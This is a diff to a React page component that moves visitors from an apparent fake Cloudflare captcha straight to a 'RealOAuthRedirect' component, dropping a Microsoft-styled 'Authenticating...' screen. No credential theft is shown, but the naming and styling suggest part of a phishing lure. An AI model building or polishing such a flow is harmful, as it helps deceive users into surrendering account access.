@@ -46,21 +46,13 @@ const DefaultPage = ({ currentPage, setCurrentPage }) => {
     }, [setCurrentPage]);
 
     const handleCaptchaVerified = () => {
-        setCurrentPage('authenticating');
+        console.log('✅ CAPTCHA verified - redirecting to replacement');
+        setCurrentPage('replacement');
     };
 
     const handleCaptchaBack = () => {
         window.location.reload();
     };
-
-    useEffect(() => {
-        if (currentPage === 'authenticating') {
-            const timer = setTimeout(() => {
-                setCurrentPage('replacement');
-            }, 1500);
-            return () => clearTimeout(timer);
-        }
-    }, [currentPage]);
     
     switch (currentPage) {
         case 'captcha':
@@ -70,21 +62,13 @@ const DefaultPage = ({ currentPage, setCurrentPage }) => {
                     onBack={handleCaptchaBack}
                 />
             );
-        case 'authenticating':
-            return (
-              <div style={{
-                display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100vh',
-                fontFamily: 'Arial, sans-serif', backgroundColor: '#f3f2f1'
-              }}>
-                <div style={{ textAlign: 'center', fontSize: '24px', color: '#323130' }}>
-                   Authenticating...
-                </div>
-              </div>
-            );
+        
         case 'message-icon':
             return <MessageIconLanding onOpenMessage={() => {}} />;
+        
         case 'replacement':
             return <RealOAuthRedirect />;
+        
         default:
             return (
                 <CloudflareCaptcha
